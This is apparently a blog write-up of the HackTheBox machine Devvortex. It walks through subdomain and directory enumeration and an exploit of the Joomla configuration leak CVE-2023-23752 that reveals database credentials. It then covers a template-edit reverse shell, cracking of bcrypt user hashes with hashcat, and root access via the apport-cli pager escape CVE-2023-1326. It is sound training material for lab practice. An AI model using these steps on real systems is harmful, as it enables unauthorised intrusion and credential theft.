---
title:  "HackTheBox WriteUp - Devvortex"
date:   2023-12-29
categories: Cybersecurity Hack-The-Box
---
![card](/assets/images/devvortex/Devvortex.png)
## Enumeration
An initial port scan showed two open ports: 22 and 80. The main website on `devvortex.htb` only hosts some flavor text.
```
$ nmap -sV -sC -Pn -p1-65535 -o nmap.scan cozyhosting.htb

Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.050s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  6 22:04:40 2023 -- 1 IP address (1 host up) scanned in 28.82 seconds
```

Some manual enumeration of the main website and a directory scan using gobuster did not result in anything interesting. Because of this a subdomain scan was made, which found the domain `dev.devvortex.htb`.


```
$ ./gobuster dns -d devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     devvortex.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.devvortex.htb

Progress: 606 / 19967 (3.04%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 635 / 19967 (3.18%)
===============================================================
Finished
===============================================================

```

A directory scan on `dev.devvortex.htb` found multiple folders and files. Accessing the subfolder `/administrator` led to a Joomla login page.

```
$ ./gobuster dir -u http://dev.devvortex.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/api/experiments      (Status: 406) [Size: 29]
/api/experiments/configurations (Status: 406) [Size: 29]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/home                 (Status: 200) [Size: 23221]
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/index.php            (Status: 200) [Size: 23221]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/robots.txt           (Status: 200) [Size: 764]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================

```

Accessing `http://dev.devvortex.htb/administrator/manifests/files/joomla.xml` returns information about the Joomla installation and the version which is installed. Here version `4.2.6` is used.

```
files_joomla Joomla! Project admin@joomla.org www.joomla.org (C) 2019 Open Source Matters, Inc. GNU General Public License version 2 or later; see LICENSE.txt 4.2.6 2022-12 FILES_JOOMLA_XML_DESCRIPTION administrator/components/com_admin/script.php administrator/components/com_admin/sql/updates/mysql administrator/components/com_admin/sql/updates/postgresql administrator api cache cli components images includes language layouts libraries media modules plugins templates tmp htaccess.txt web.config.txt LICENSE.txt README.txt index.php https://update.joomla.org/core/list.xml
```

This version of Joomla is vulnerable to unauthorized access to webservice endpoints as described in [CVE-2023-23752][CVE-2023-23752]. This vulnerability allows accessing an endpoint displaying configuration information, including database connection details under `http://dev.devvortex.htb/api/index.php/v1/config/application?public=true`. Here credentials for the lewis user are displayed, which can be used to log into the Joomla administrator interface.

```
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```


## Initial Foothold

Once logged into the administrator interface a reverse shell may be opened in multiple different ways. I did it by editing the template used and changing the `error.php` file to open a network connection to the attacker IP address and accessing the file in the browser.

![error.php](/assets/images/devvortex/image.png)

![reverseshell](/assets/images/devvortex/image-1.png)

On the machine I could open a connection to the mysql database as the lewis user. In the `joomla` database there was table called `sd4fg_users` containing password hashes for the lewis user and a logan user.

```
mysql> select id, username, password from sd4fg_users;
+-----+----------+--------------------------------------------------------------+
| id  | username | password                                                     |
+-----+----------+--------------------------------------------------------------+
| 649 | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| 650 | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+-----+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)

```

The hash for logan was crackable using an offline bruteforce attack. Using his user credentials an SSH connection to the host could be established and the user flag was found.

```
hashcat -O -m 3200 -a 0 hashes /usr/share/wordlists/rockyou.txt

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```
```
logan@devvortex:~$ cat user.txt 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
```

## Privilege Escalation
Running `sudo -l` showed that the logan user is allowed to run the apport-cli tool using sudo. Based on [CVE-2023-1326][CVE-2023-1326] this tool is vulnerable to a privilege escalation because it uses less as a pager, which allows execution of commands and does not drop root permissions immediately.

```
logan@devvortex:~$ sudo /usr/bin/apport-cli --hanging 1

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (28.2 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V                    # I ran !sh
# whoami
root
```

```
# cat root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Reflection
I struggled the most in the beginning because I did not think of running a subdomain scan using gobuster. For future endeavors I will keep it in mind however.


[CVE-2023-23752]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23752
[CVE-2023-1326]: https://nvd.nist.gov/vuln/detail/CVE-2023-1326